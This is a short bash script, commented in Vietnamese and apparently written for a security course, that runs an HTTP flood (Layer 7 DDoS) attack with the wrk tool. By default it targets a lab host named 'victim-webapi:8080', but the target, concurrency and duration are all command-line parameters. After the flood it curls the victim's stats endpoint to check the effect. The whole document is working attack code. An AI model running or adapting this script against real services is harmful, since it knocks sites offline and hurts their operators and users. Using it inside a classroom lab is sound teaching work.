#!/bin/bash
# ============================================
# Script: HTTP Flood Attack (Layer 7 DDoS)
# Mục đích: Học tập / bài tập ATT
# Target: victim-webapi:8080
# ============================================

TARGET=${1:-"http://victim-webapi:8080"}
CONCURRENCY=${2:-100}       # Số kết nối đồng thời
DURATION=${3:-30}           # Thời gian tấn công (giây)
REQUESTS_PER_CONN=${4:-1000}

echo "========================================"
echo " HTTP FLOOD ATTACK - MÔ PHỎNG DDoS"
echo "========================================"
echo " Target    : $TARGET"
echo " Concurrent: $CONCURRENCY connections"
echo " Duration  : ${DURATION}s"
echo " Tool      : wrk"
echo "========================================"
echo ""
echo "[*] Bắt đầu tấn công HTTP Flood..."
echo "[*] Nhấn Ctrl+C để dừng"
echo ""

# Dùng wrk để HTTP Flood
wrk -t$CONCURRENCY -c$CONCURRENCY -d${DURATION}s \
    --timeout 5s \
    --latency \
    "$TARGET"

echo ""
echo "[*] Tấn công hoàn tất. Kiểm tra stats trên victim:"
curl -s "$TARGET/stats" | python3 -m json.tool 2>/dev/null || curl -s "$TARGET/stats"
